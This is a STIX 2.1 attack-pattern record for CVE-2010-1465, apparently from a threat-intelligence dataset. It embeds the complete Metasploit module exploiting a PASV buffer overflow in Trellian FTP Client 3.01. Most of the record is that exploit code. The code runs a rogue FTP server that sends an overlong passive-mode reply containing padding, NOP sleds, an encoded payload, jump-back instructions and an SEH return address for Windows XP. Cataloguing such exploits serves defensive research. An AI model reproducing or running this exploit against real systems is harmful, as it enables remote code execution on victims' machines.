{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7aad6514-d3f3-44b0-89de-8856a365c236",
    "created": "2024-08-14T16:51:22.032184Z",
    "modified": "2024-08-14T16:51:22.032188Z",
    "name": "Trellian FTP Client 3.01 PASV Remote Buffer Overflow",
    "description": " This module exploits a buffer overflow in the Trellian 3.01 FTP client that is triggered through an excessively long PASV message. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/trellian_client_pasv.rb",
            "external_id": "trellian_client_pasv.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1465"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Trellian FTP Client 3.01 PASV Remote Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the Trellian 3.01 FTP client that is triggered\n        through an excessively long PASV message.\n      },\n      'Author' \t =>\n        [\n          'zombiefx',  # Original exploit author\n          'dookie'     # MSF module author\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1465'],\n          [ 'OSVDB', '63812'],\n          [ 'EDB', '12152' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 900,\n          'BadChars' => \"\\x00\\x29\\x2c\\x2e\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP Universal', { 'Ret' => \"\\xfd\\x21\\x40\" } ], # 0x004021fd  p/p/r in ftp.exe\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-04-11',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The FTP port to listen on\", 21 ]),\n      ])\n  end\n\n  def on_client_connect(client)\n    return if ((p = regenerate_payload(client)) == nil)\n\n    # Let the client log in\n    client.get_once\n\n    user = \"331 Please specify the password.\\r\\n\"\n    client.put(user)\n\n    client.get_once\n    pass = \"230 Login successful.\\r\\n\"\n    client.put(pass)\n\n    # Handle the clients PWD command\n    client.get_once\n    pwd = \"257 \\\"/\\\" is current directory.\\r\\n\"\n    client.put(pwd)\n    client.get_once\n\n    sploit = \"227 Entering Passive Mode (\"\n    sploit << rand_text_alpha_upper(2171)\n    sploit << make_nops(100)\n    sploit << payload.encoded\n    sploit << make_nops(900 - (payload.encoded.length))\n    sploit << \"\\xe9\\x18\\xfc\\xff\\xff\"  # Jump back 1000 bytes\n    sploit << \"\\xeb\\xf9\\x90\\x90\"      # Jump back 7 bytes\n    sploit << [target.ret].pack(\"A3\")\n    sploit << \")\\r\\n\"\n\n    client.put(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-04-11",
    "x_mitre_platforms": [
        "win'"
    ]
}